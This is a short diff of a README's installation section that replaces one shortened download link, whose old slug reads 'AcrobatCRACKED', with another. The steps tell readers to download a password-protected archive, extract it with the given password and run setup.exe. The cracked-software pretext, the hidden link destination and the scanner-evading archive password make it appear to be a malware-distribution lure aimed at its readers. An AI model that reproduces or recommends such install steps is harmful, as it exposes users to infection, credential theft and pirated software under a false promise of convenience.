@@ -9,7 +9,7 @@
 ## 📥 Installation & Launch
 
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **[Download](https://goo.su/AcrobatCRACKED) and extract archive(pass: Project12!)**  
+1️⃣ **[Download](https://goo.su/P4pXW) and extract archive(pass: Project12!)**  
 2️⃣ **Run `setup.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
